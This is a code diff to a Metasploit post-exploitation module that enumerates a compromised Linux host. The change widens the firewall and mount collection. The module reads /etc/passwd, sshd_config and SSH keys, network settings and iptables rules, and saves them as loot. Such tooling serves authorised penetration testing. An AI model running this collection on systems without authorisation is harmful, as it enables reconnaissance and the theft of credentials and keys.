@@ -65,10 +65,12 @@ class Metasploit3 < Msf::Post
 		print_status("Collecting data...")
 
 		users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
-		nconfig = execute("/sbin/ifconfig")
+		nconfig = execute("/sbin/ifconfig -a")
 		routes = execute("/sbin/route")
-		mount = execute("/bin/mount")
+		mount = execute("/bin/mount -l")
 		iptables = execute("/sbin/iptables -L")
+		iptables_nat = execute("/sbin/iptables -L -t nat")
+		iptables_man = execute("/sbin/iptables -L -t mangle")
 		resolv = cat_file("/etc/resolv.conf")
 		sshd_conf = cat_file("/etc/ssh/sshd_config")
 		hosts = cat_file("/etc/hosts")
@@ -88,13 +90,14 @@ class Metasploit3 < Msf::Post
 		save("Network config", nconfig)
 		save("Route table", routes)
 		save("Mounted drives", mount)
-		save("Firewall config", iptables)
+		save("Firewall config", iptables + iptables_nat + iptables_man)
 		save("DNS config", resolv)
 		save("SSHD config", sshd_conf)
 		save("Host file", hosts)
 		save("SSH keys", ssh_keys) unless ssh_keys.empty?
 		save("Linux Installed Packages", installed_pkg)
 		save("Linux Configured Services", installed_svc)
+
 
 	end
 
